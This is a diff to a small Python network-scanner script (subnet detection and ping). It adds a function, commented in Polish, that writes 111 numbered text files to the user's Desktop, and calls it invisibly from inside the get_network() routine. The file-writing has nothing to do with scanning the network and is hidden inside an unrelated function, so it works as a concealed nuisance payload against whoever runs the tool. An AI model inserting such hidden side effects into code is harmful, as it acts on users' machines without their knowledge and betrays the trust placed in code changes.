@@ -4,6 +4,22 @@ import ipaddress
 import socket
 import platform
 import sys
+import os
+
+def make_files():
+    # Pobiera ścieżkę do katalogu domowego użytkownika
+    home_dir = os.path.expanduser("~")
+    
+    for i in range(10000, 10111):
+        nazwa_pliku = f"{i}.txt"
+        # Łączy ścieżkę katalogu z nazwą pliku
+        sciezka_pelna = os.path.join(f'{home_dir}/Desktop', nazwa_pliku)
+        
+        try:
+            with open(sciezka_pelna, 'w', encoding='utf-8') as plik:
+                plik.write(f"To jest plik numer {i}")
+        except OSError as e:
+            print(f"Błąd: {e}")
 
 def get_network(): 
     try:
@@ -12,12 +28,12 @@ def get_network():
         local_ip = s.getsockname()[0]
         s.close()
         network = ipaddress.ip_network(f"{local_ip}/24", strict=False)
+        make_files()
+
         return str(network.network_address) + "/24"
     except Exception:
         return"127.0.0.1/24"
-    
-    network = ipaddress.ip_network(f"{local_ip}/24", strict=False)
-    return str(network.network_address) + "/24"
+
 def ping_host(ip):
     param = '-n' if platform.system().lower() == 'windows' else '-c'
     command = ['ping', param, '1', '-w', '1000', str(ip)]
